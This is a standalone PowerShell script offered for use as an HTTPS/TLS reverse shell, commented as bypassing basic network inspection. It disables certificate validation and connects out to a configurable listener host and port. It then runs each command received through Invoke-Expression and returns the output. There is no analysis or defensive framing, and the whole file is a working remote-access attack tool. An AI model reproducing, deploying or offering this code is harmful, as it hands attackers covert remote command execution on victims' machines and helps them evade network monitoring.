# PowerShell HTTPS Reverse Shell with SSL/TLS
# Bypasses basic network inspection
# Configure LHOST and LPORT before use

param(
    [string]$LHOST = "192.168.1.100",
    [int]$LPORT = 443
)

# Ignore SSL certificate errors
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCerts : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@

[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCerts
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

try {
    $client = New-Object System.Net.WebClient
    $client.BaseAddress = "https://$LHOST`:$LPORT"
    
    $tcp = New-Object System.Net.Sockets.TcpClient($LHOST, $LPORT)
    $ssl = New-Object System.Net.Security.SslStream($tcp.GetStream())
    $ssl.AuthenticateAsClient($LHOST)
    
    $writer = New-Object System.IO.StreamWriter($ssl)
    $reader = New-Object System.IO.StreamReader($ssl)
    
    $writer.WriteLine("PowerShell HTTPS Shell Connected!")
    $writer.Flush()
    
    while ($true) {
        $writer.Write("PS > ")
        $writer.Flush()
        
        $cmd = $reader.ReadLine()
        
        if ($cmd -eq "exit" -or $cmd -eq "quit") {
            break
        }
        
        try {
            $result = Invoke-Expression $cmd 2>&1 | Out-String
            $writer.WriteLine($result)
        } catch {
            $writer.WriteLine("Error: $_")
        }
        $writer.Flush()
    }
    
    $tcp.Close()
} catch {
    Write-Host "Connection failed: $_"
}